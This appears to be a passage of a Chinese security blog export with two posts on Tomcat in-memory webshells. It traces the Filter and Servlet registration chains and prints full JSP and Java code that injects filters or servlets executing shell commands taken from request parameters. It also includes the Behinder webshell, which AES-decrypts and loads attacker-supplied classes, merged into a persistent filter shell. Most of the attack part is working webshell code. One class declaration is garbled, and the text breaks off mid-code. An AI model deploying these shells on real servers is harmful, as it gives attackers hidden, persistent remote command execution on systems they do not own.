+这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第92行有Filter调用了doFilter()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/421c0023-95fc-477e-8fe2-c32676f39cad.png)
+
+这个Listener来自ApplicationFilterChain.filters这个成员变量，我们跟进ApplicationFilterChain.filters
+
+![](https://s3.hedgedoc.org/demo/uploads/981d0bdc-6726-433f-b147-08ce0dfc1c52.png)
+
+ApplicationFilterChain.filters是一个元素为ApplicationFilterConfig对象的数组，可以看到数组中含有我们写的MyFilter
+
+这里我们搜索关键字“this.filters”，看看哪里可以是否有添加元素的方法
+
+145行的ApplicationFilterChain.addFilter()方法可以向filters添加元素
+
+![](https://s3.hedgedoc.org/demo/uploads/aa80f199-c938-4726-99bf-48885def1db3.png)
+
+这个方法先对现在的filters进行遍历，将传入的ApplicationFilterConfig对象与filters中的ApplicationFilterConfig对象进行对比，如果想等，则直接跳出循环（149-152行）；如果不想等，则先判断此时的n的长度和filers的长度是否相同，如果相同，则将filters的长度扩大10，最后将传入的ApplicationFilterConfig对象添加到filtrs中，同时n增长1
+
+其实就是判断添加进的ApplicationFilterConfig对象是否重复，并且在添加时候判断filters满了没，满了就扩大10个位置，免得ApplicationFilterConfig对象装不进去
+
+但是值得注意的是，这里的ApplicationFilterChain.filters最开始里面并没有元素（new ApplicationFilterConfig[0];），也就是说并没有Filter对象，而这里却包含了我们的MyFilter，说明给filters添加元素的方法在后面的调用链中
+
+所以在后面的调用链中重点关注“ApplicationFilterChain”和“addFilter”
+
+继续调试跟进，在进入StandardWrapperValve.invoke()方法时候，创建了一个ApplicationFilterChain对象filterChain，是通过ApplicationFilterFactory.createFilterChain()方法获取到的
+
+![](https://s3.hedgedoc.org/demo/uploads/866f58ce-6776-490d-ae52-b57867362cb9.png)
+
+跟进ApplicationFilterFactory.createFilterChain()方法，发现第64行调用了ApplicationFilterChain.addFilter()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/1f8a5cb0-7240-40a8-a450-adda06ad2529.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/32fdeec6-a9fa-4b6e-aa77-1a2f8387e1f6.png)
+
+这里稍微分析一下
+1. 从Wrapper对象中获取到StandardContext对象
+2. 从StandardContext对象获取到FilterMaps对象
+3. 遍历FilterMaps对象获取FilterMap对象
+4. 判断请求中的路由和FilterMap对象中设置的路由是否想等，同时判断请求中的调度器与FilterMap对象中设置的调度器（dispatcherMapping）是否相同
+5. 如果相同，就将FilterMap对象的FilterName传入到StandardContext.getFilterConfig()方法中获取到FilterConfig对象，接着再强转为ApplicationFilterConfig对象
+6. 最后将ApplicationFilterConfig对象通过ApplicationFilterChain.addFilter()方法加入到filters中
+
+从流程可以看出，FilterMap是一个存储Filter映射规则的对象
+
+这里6个流程中，第5个流程有点复杂
+
+我们先跟进到StandardContext.getFilterConfig()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/d8580a34-e40d-4dff-a919-6e9ccd9eb339.png)
+
+这么看来，FilterConfig对象其实就是从StandardContext.filterConfigs这个成员变量中获取
+
+跟进StandardContext.filterConfigs
+
+![](https://s3.hedgedoc.org/demo/uploads/469d1f09-334d-48b6-add6-74432be2c220.png)
+
+StandardContext.filterConfigs是一个HashMap对象，用键、值的方式存储，所以StandardContext.getFilterConfig()方法就是通过键（filterName）获取到ApplicationFilterConfig对象
+
+String类型的filterName好解决，但是ApplicationFilterConfig的创建就难了，我们跟进到ApplicationFilterConfig的构造函数
+
+![](https://s3.hedgedoc.org/demo/uploads/73519be3-7a48-4f5b-922c-e9a934d24020.png)
+
+构造函数没有用public修饰，所以只能反射获取ApplicationFilterConfig对象，而且ApplicationFilterConfig需要用到FilterDef对象
+
+我们直接在ApplicationFilterConfig的构造函数那里打个断点，然后调试，看看初始化的时候FilterDef对象中有啥
+
+![](https://s3.hedgedoc.org/demo/uploads/3c2b90fa-cac3-4ea4-92cc-143fe3b8fd30.png)
+
+可以看到，此时的FilterDef对象中，设置了filter、filterClass、filterName、asyncSupported四个属性
+
+1. filter就是Filter对象
+2. filterClass就是Filter对象的class
+3. filterName就是Filter对象的名称
+4. asyncSupported不知道是啥，照葫芦画瓢也设置成"true"
+## 3.4、动态注册Filter实现内存马
+综上所述，想要将我们的Filter加入到StandardContext.filters中，代码逻辑如下：
+1. 写一个Filter
+2. 获取到一个StandardContext对象
+3. 创建一个FilterDef对象
+  a. 设置FilterDef.filterName
+  b. 设置FilterDef.filterClass
+  c. 设置FilterDef.filter
+  d. 设置FilterDef.asyncSupported
+4. 将FilterDef对象加入到StandardContext.filterDefs中
+5. 创建一个FilteMap对象
+  a. 设置FilteMap.FilterName
+  b. 设置FilteMap.urlPatterns
+  c. 设置FilteMap.dispatcherMapping
+6. 将FilteMap对象加入到StandardContext.FilterMaps中
+7. 通过StandardContext和FilterDef两个对象，反射创建一个ApplicationFilterConfig对象
+8. ApplicationFilterConfig对象(filter对象)通过HashMap.put()方法加入进StandardContext.filterConfigs中
+
+完整jsp代码如下
+```
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.util.HashMap" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="java.io.PrintWriter" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@page language="java" contentType="text/html; charset=UTF-8" %>
+
+<%-- Filter --%>
+<%
+    class MyFilter implements Filter {
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException {
+        }
+
+        @Override
+        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            String commmand = servletRequest.getParameter("filter_cmd");
+            if(commmand != null) {
+                try {
+                    Runtime.getRuntime().exec(commmand);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+
+    MyFilter myFilter = new MyFilter();
+    String filterName = "lan";
+%>
+
+<%-- 获取到StandardContext对象 --%>
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%-- 创建一个FilterDef对象 --%>
+<%
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilterName(filterName);
+    filterDef.setFilterClass(myFilter.getClass().getName());
+    filterDef.setFilter(myFilter);
+    filterDef.setAsyncSupported("true");
+%>
+
+<%-- 将FilterDef对象加入到StandardContext.filterDefs中 --%>
+<%
+    standardContext.addFilterDef(filterDef);
+%>
+
+<%-- 创建一个FilteMap对象 --%>
+<%
+    FilterMap filterMap = new FilterMap();
+    filterMap.addURLPattern("/myfilter");
+    filterMap.setFilterName(filterName);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+%>
+
+<%-- 将FilteMap对象加入到StandardContext.FilterMaps中 --%>
+<%
+    standardContext.addFilterMap(filterMap);
+%>
+
+<%-- 获取到ApplicationFilterConfig对象 --%>
+<%
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+%>
+
+<%-- 将filter添加到filterConfigs中 --%>
+<%
+    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+    filterConfigsField.setAccessible(true);
+    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
+    filterConfigs.put(filterName,filterConfig);
+%>
+
+```
+
+顺便说一嘴，将FilteMap对象加入到StandardContext.FilterMaps中时候，可以用StandardContext.addFilterMapBefore()方法，这个方法的作用是将Filter对象添加到链条的第一位，也就是每次触发filter时候都是优先我们的链条
+## 3.5、验证
+在web.xml中没有添加Filter的情况下，输入路由/myfilter?filter_cmd=notepad
+
+![](https://s3.hedgedoc.org/demo/uploads/235cca7d-a65e-4c99-a95f-ca722b64e7b3.png)
+
+没有弹出记事本，毫无反应
+
+访问实现动态注册的MyFilter.jsp
+
+![](https://s3.hedgedoc.org/demo/uploads/15bd2a17-3aac-42c7-9ffb-6f8fdfde1817.png)
+
+再次访问路由/myfilter?filter_cmd=notepad
+
+![](https://s3.hedgedoc.org/demo/uploads/ea09c2c0-3183-4dc6-9819-a40672f2b6a8.png)
+
+成功弹出记事本
+# 4、Servlet内存马
+## 4.1、简述
+Servlet主要用于处理请求并生成响应，因此其主要作用是在Web应用程序中实现服务器端的业务逻辑。
+
+而Servlet是封装在Wrapper中，每一个Servlet都对应了一个Wrapper，当请求从Context向特定的Wrapper发送时，其实就是向Servlet发送，所以，也可以将Wrapper看作是一个Servlet
+## 4.2、编写一个Servlet
+首先写一个Servlet，然后在web.xml中配置
+
+```
+package com.tomcatd0.servlet;
+
+import javax.servlet.*;
+import java.io.IOException;
+
+public class MyServlet implements Servlet {
+
+    @Override
+    public void init(ServletConfig servletConfig) throws ServletException {
+
+    }
+
+    @Override
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+
+    @Override
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
+        String commmand = servletRequest.getParameter("servlet_cmd");
+        if(commmand != null) {
+            try {
+                Runtime.getRuntime().exec(commmand);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+
+    @Override
+    public String getServletInfo() {
+        return null;
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+}
+
+```
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    
+    <servlet>
+        <servlet-name>MyServlet</servlet-name>
+        <servlet-class>com.tomcatd0.servlet.MyServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>MyServlet</servlet-name>
+        <url-pattern>/myservlet</url-pattern>
+    </servlet-mapping>
+
+</web-app>
+    
+
+```
+
+访问路由：/myservlet?servlet_cmd=calc
+
+成功弹出计算器
+## 4.3、调用链分析
+在service()方法边上打个断点
+
+![](https://s3.hedgedoc.org/demo/uploads/6aa7d808-a3ce-44de-a38e-e25692f95618.png)
+
+开启调试，调用链如下：
+
+![](https://s3.hedgedoc.org/demo/uploads/3477af1c-ff6c-41e7-b0a3-882cce2a46cb.png)
+
+这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第118行有Servlet对象调用了service()方法，后面我们需要关注这个Servlet对象咋来的
+
+![](https://s3.hedgedoc.org/demo/uploads/4137f19e-2f35-418b-a013-b12c2c0bf247.png)
+
+跟进一下this.service，可以看到，ApplicationFilterChain.service没有初始化（值为null），我们搜一下关键字“this.servlet”看看有哪个方法可以给他赋值的
+
+![](https://s3.hedgedoc.org/demo/uploads/361184fe-6d4a-4758-a3e5-5a31eef76a8f.png)
+
+180行的ApplicationFilterChain.setServlet()方法可以，那么后面我们就注意看看哪条链调用了ApplicationFilterChain.setServlet()方法，主要是注意关键字“ApplicationFilterChain”和“setServlet(”
+
+![](https://s3.hedgedoc.org/demo/uploads/8255f30e-c2e7-4137-82f8-d513dc884ca6.png)
+
+这里跟进到了StandardWrapperValve.invoke()方法，第97行实例化了个ApplicationFilterChain，跟进ApplicationFilterFactory.createFilterChain()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/09c3f4c2-de2f-4f82-a4b6-a6aaa6d3a77f.png)
+
+在ApplicationFilterFactory.createFilterChain()方法中，第40行调用了ApplicationFilterChain.setServlet()方法，我们跟进一下它的参数servlet
+
+![](https://s3.hedgedoc.org/demo/uploads/7e75690c-6421-487e-99c7-6948a7137c0f.png)
+
+确认到是传参传入的servlet，我们又需要回到StandardWrapperValve.invoke()方法，因为是StandardWrapperValve.invoke()方法中调用了ApplicationFilterFactory.createFilterChain()方法的
+
+![](https://s3.hedgedoc.org/demo/uploads/8891ed1e-3507-45b6-9fd4-4e1c3d546190.png)
+
+我们跟进下StandardWrapperValve.invoke()方法中第98行传入的servlet，看看servlet咋来的
+
+![](https://s3.hedgedoc.org/demo/uploads/cbf934e2-4d38-4f97-9648-4ee173d8c54e.png)
+
+这里的servlet也是没有初始化的，继续往下面看代码
+
+![](https://s3.hedgedoc.org/demo/uploads/bd116cd1-d006-4152-92a9-c4fa78386ec1.png)
+
+第65行有一个if条件，此时unavailable是false，!false=true，所以进入到了servlet = wrapper.allocate();，我们可以知道，servlet来自StandardWrapper.allocate()方法，我们跟进StandardWrapper.allocate()
+
+![](https://s3.hedgedoc.org/demo/uploads/c885a5f2-f020-4ac2-a7d9-667ab7167d70.png)
+
+下面我们对StandardWrapper.allocate()方法进行分析
+
+![](https://s3.hedgedoc.org/demo/uploads/4dd45e97-6da0-4dcf-a91e-7e7c7c302f71.png)
+
+根据StandardWrapper的属性和StandardWrapper.allocate()方法的代码逻辑，最终会走到337行的代码，看上面的图，this.instance其实就一个Servlet对象
+
+不过有意思的来了，代码第331行有两条路可以走，如果this.instance还没有初始化（==null），那就会走到第337行进行初始化；如果已经初始化了（!=null），那就直接返回Servlet
+
+![](https://s3.hedgedoc.org/demo/uploads/33b58178-d62a-4410-94af-badca7390972.png)
+
+作为一条懒狗，少一事不如多一事，我们搜一下关键字“this.instance”看看有没有直接可以初始化的函数
+
+第247行StandardWrapper.setServlet()方法满足这个条件
+
+![](https://s3.hedgedoc.org/demo/uploads/6d07ec33-0c1c-421a-b6d7-791c25815814.png)
+
+ok，Servlet知道是咋可以搞的了，所以我们只需要将Wrapper装入StandardContext中，然后正常触发就完成了
+
+因为组件都是继承于ContainerBase这个抽象类，所以都会用父组件的addChild()方法将子组件添加到父组件中
+
+这里我们跟进到StandardContext.addChild()方法
+
+![](https://s3.hedgedoc.org/demo/uploads/49d69119-80dd-44b3-8e5c-caa21f12a683.png)
+
+首先会通过Servlet名字判断这个Servlet是否为jsp（红框1），如果不是，就将child（StandardWrapper）添加到StandardContext中（红框2），然后再给这个child添加一个路由映射（红框3）
+## 4.4、动态注册Servlet实现内存马
+综上所述，想要将我们的Servlet动态注册，代码逻辑如下：
+1. 写一个Servlet
+2. 获取一个StandardContext
+3. 获取一个StandardWrapper对象
+4. 将StandardWrapper加入到StandardContext
+5. 设置StandardWrapper路由映射
+完整jsp代码如下：
+```
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%!
+
+    public class MyServlet implements Servlet {
+        @Override
+        public void init(ServletConfig config) throws ServletException {
+        }
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+        @Override
+        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+            String cmd = req.getParameter("servlet_cmd");
+            if (cmd !=null){
+                try{
+                    Runtime.getRuntime().exec(cmd);
+                }catch (IOException e){
+                    e.printStackTrace();
+                }catch (NullPointerException n){
+                    n.printStackTrace();
+                }
+            }
+        }
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+        @Override
+        public void destroy() {
+        }
+    }
+    MyServlet myServlet = new MyServlet();
+
+%>
+
+<%
+    String name = myServlet.getClass().getSimpleName();
+
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setName(name);
+    wrapper.setServlet(myServlet);
+%>
+
+<%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded("/myservlet",name);
+%>
+
+```
+## 4.5、验证
+在web.xml中没有添加Servlet的情况下，输入路由/myservlet?servlet_cmd=notepad
+
+![](https://s3.hedgedoc.org/demo/uploads/57d64579-6cf5-410c-a91f-67d0dc857d86.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/a48492aa-e611-4bcd-9236-d40221d17e62.png)
+
+没有弹出记事本，毫无反应
+
+访问实现动态注册的MyServlet.jsp
+
+![](https://s3.hedgedoc.org/demo/uploads/830850f2-cd61-49b3-a4a5-e9a1cb310a7d.png)
+
+再次访问路由/myservlet?servlet_cmd=notepad
+
+![](https://s3.hedgedoc.org/demo/uploads/d6cc7d76-5ca4-4bdc-85bd-7cd9068d4e95.png)
+
+成功弹出记事本
+
+# 5、总结
+Listener内存马：
+1. 将我们的Listener添加到applicationEventListenersList中即可
+
+Filter内存马：
+1. 设置FilterDef对象，其中包含了Filter的配置属性，然后添加到StandardContext.filterDefs
+2. 设置FilteMap对象，其中包含了Filter的映射路由StandardContext.filterMaps
+3. 设置ApplicationFilterConfig对象，并将其添加到StandardContext.filterConfigs
+
+Servlet内存马：
+1. 设置一个Wrapper对象，其中包含了Servlet的配置属性
+2. 将Wrapper添加到StandardContext对象中
+3. 在StandardContext中设置Wrapper的访问路由
+
+# 6、完结？
+好像还有一个value内存马，在houst中触发的？
+不过内存马先暂时告落一段时间
+顺便说一下，在学了tomcat基础知识后，就真的好懂了很多
+接下来要的去学冰蝎马如何编写的，内存马+冰蝎
+
+# 7、学习
+https://blog.csdn.net/weixin_41835612/category_10674061.html
+
+https://xz.aliyun.com/t/10196
+
+https://goodapple.top/archives/1355
+
+http://oceaner.cn/2023/06/11/tomcat-nei-cun-ma/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>内存马</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat冰蝎内存马</title>
+    <url>/2023/08/22/Tomcat%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/</url>
+    <content><![CDATA[# 1、简述
+目前打内存马的场景鄙人就遇到了两种
+1. 上传jsp文件，然后访问，注入内存马
+2. 通过序列化漏洞如log4j2、fastjson直接打进入
+不过第二种情况用得比第一种多，直接拿webshell维权
+
+最终的webshell都是放入冰蝎或者哥斯拉等进行管理或者后渗透，所以接下来就将学一下
+
+# 2、冰蝎
+这里用Filter举例
+
+首先我们的Filter的jsp内存马子如下：
+```
+<%@ page import="org.apache.catalina.connector.RequestFacade" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.util.HashMap" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="java.lang.reflect.Constructor" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@page language="java" contentType="text/html; charset=UTF-8" %>
+
+<%-- Filter --%>
+<%
+    class MyFilter implements Filter {
+        @Override
+        public void init(FilterConfig filterConfig) throws ServletException {
+        }
+
+        @Override
+        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+            String commmand = servletRequest.getParameter("filter_cmd");
+            if(commmand != null) {
+                String osName = System.getProperty("os.name");
+                if (osName.toLowerCase().contains("win")) {
+                    Runtime.getRuntime().exec(new String[]{"cmd", "/c", commmand});
+                } else {
+                    Runtime.getRuntime().exec(new String[]{"bash", "-c", commmand});
+                }
+            }
+        }
+
+        @Override
+        public void destroy() {
+        }
+    }
+
+    MyFilter myFilter = new MyFilter();
+    String filterName = "lan";
+%>
+
+<%-- 获取到StandardContext对象 --%>
+<%
+    RequestFacade requestFacade = (RequestFacade) request;
+    Class requestFacadeClass = requestFacade.getClass();
+    Field getRequestField = requestFacadeClass.getDeclaredField("request");
+    getRequestField.setAccessible(true);
+    Request getRequest = (Request) getRequestField.get(requestFacade);
+    StandardContext standardContext = (StandardContext) getRequest.getContext();
+%>
+
+<%-- 创建一个FilterDef对象 --%>
+<%
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilterName(filterName);
+    filterDef.setFilterClass(myFilter.getClass().getName());
+    filterDef.setFilter(myFilter);
+    filterDef.setAsyncSupported("true");
+%>
+
+<%-- 将FilterDef对象加入到StandardContext.filterDefs中 --%>
+<%
+    standardContext.addFilterDef(filterDef);
+%>
+
+<%-- 创建一个FilteMap对象 --%>
+<%
+    FilterMap filterMap = new FilterMap();
+    filterMap.addURLPattern("/*");
+    filterMap.setFilterName(filterName);
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+%>
+
+<%-- 将FilteMap对象加入到StandardContext.FilterMaps中 --%>
+<%
+    standardContext.addFilterMap(filterMap);
+%>
+
+<%-- 获取到ApplicationFilterConfig对象 --%>
+<%
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+%>
+
+<%-- 将filter添加到filterConfigs中 --%>
+<%
+    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+    filterConfigsField.setAccessible(true);
+    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
+    filterConfigs.put(filterName,filterConfig);
+%>
+
+```
+这里有2个坑:
+
+获取Context对象这里没有用ServletRequest取，而是直接从线程中取的：https://xz.aliyun.com/t/9914
+
+在获取到StandardContext.filterConfigs这个成员变量的时候，用standardContext.getClass().getDeclaredField("filterConfigs")方法无法获取到，要用Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs")才行，搞了好久nnd
+
+效果：
+
+![](https://s3.hedgedoc.org/demo/uploads/886e8d08-6267-425b-807c-2ce01a93990e.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/70642830-e1ab-40b3-a61f-d7008b3a65fc.png)
+
+接着看下冰蝎的jsp马子
+
+```
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
+```
+
+看不懂，换行缩进回车一下
+
+```
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
+<%@ page import="sun.misc.BASE64Decoder" %>
+<%!
+    class U extends ClassLoader{
+        U(ClassLoader c){
+            super(c);
+        }
+        public Class g(byte []b){
+            return super.defineClass(b,0,b.length);
+        }
+    }
+%>
+<%
+    if (request.getMethod().equals("POST")){
+        String k="e45e329feb5d925b";
+        session.putValue("u",k);
+        Cipher c=Cipher.getInstance("AES");
+        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
+        String body = request.getReader().readLine();
+        BASE64Decoder base64Decoder = new BASE64Decoder();
+        byte[] baseDecodeByte = base64Decoder.decodeBuffer(body);
+        byte[] aesDecodeByte = c.doFinal(baseDecodeByte);
+        U newu = new U(this.getClass().getClassLoader());
+        Class classU = newu.g(aesDecodeByte);
+        Object newclass = classU.newInstance();
+        boolean result = newclass.equals(pageContext);
+    }
+%>
+
+<% out.print("success!"); %>
+
+```
+
+稍微分析一下
+
+首先对定义一个ClassLoader类，它的方法g()作用是调用ClassLoader.defineClass()方法将传入的byte[]转化为Class对象
+
+![](https://s3.hedgedoc.org/demo/uploads/3903d225-3e35-47a6-ab94-59f41eb8cb3e.png)
+
+然后判断请求的是否为POST请求，如果是，就读取数据包的请求体中的内容，然后Base64+AES解码得到数据码（aesDecodeByte）
+
+![](https://s3.hedgedoc.org/demo/uploads/f0b6a84c-4a3e-4a2b-b082-6f65e0c8cdc2.png)
+
+接着，再将数据码传入到ClassLoader.defineClass()方法中转化为Class对象，最后，调用newInstance()实例化个对象，并调用其恶意对象的equals方法，传入pageContext，结束
+
+![](https://s3.hedgedoc.org/demo/uploads/0358ad1d-6c3f-46cf-b46a-45b8ac09d8c8.png)
+
+然要将冰蝎马与java源码结合，我们就直接将冰蝎马的代码逻辑放入之前写好的Filter内存马（java源码）中
+
+```
+import org.apache.catalina.Context;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * 不用改了
+ * 标准的cmd内存马&冰蝎马
+ * 用法   http://xxx.xxx.xxx.x/?cmd=whoami
+ * 密码：lan
+ * 2023/08/03
+ */
+public class BxieMem lantesta ClassLoader implements Filter{
+
+    String passwd = "73f50c9f17291ce9";
+
+    static {
+        try {
+            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            Filter myFilter = new lantesta();
+            String filterName = "lan";
+
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilterName(filterName);
+            filterDef.setFilterClass(myFilter.getClass().getName());
+            filterDef.setFilter(myFilter);
+            filterDef.setAsyncSupported("true");
+            standardContext.addFilterDef(filterDef);
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.addURLPattern("/");
+            filterMap.setFilterName(filterName);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+            standardContext.addFilterMap(filterMap);
+
+            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
+            constructor.setAccessible(true);
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
+
+            Field filterConfigsField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
+            filterConfigsField.setAccessible(true);
+            HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
+
+            filterConfigs.put(filterName,filterConfig);
+
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        String command = servletRequest.getParameter("cmd");
+        if (command != null){
+            String system = System.getProperty("os.name");
+            if (system.toLowerCase().contains("win")) {
+                Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder stringBuilder = new StringBuilder();
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line + '\n');
+                }
+
+                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+            } else {
+                Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder stringBuilder = new StringBuilder();
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    stringBuilder.append(line + '\n');
+                }
+
+                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+            }
+        }
+
+        HttpServletRequest request = (HttpServletRequest) servletRequest;
+        HttpServletResponse response = (HttpServletResponse) servletResponse;
+        HttpSession session = request.getSession();
+
+        Map<String, Object> pageContext = new HashMap<String, Object>();
+        pageContext.put("session", session);
+        pageContext.put("request", request);
+        pageContext.put("response", response);
+
+        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();
+
+        if (request.getMethod().equals("POST")) {
+            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
+                //从java.lang.ClassLoader中获取到Class对象
+                Class Lclass = cl.getClass().getSuperclass();
+                //调用RushThere()方法，将冰蝎逻辑写入内存马中
+                RushThere(Lclass, cl, session, request, pageContext);
+            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
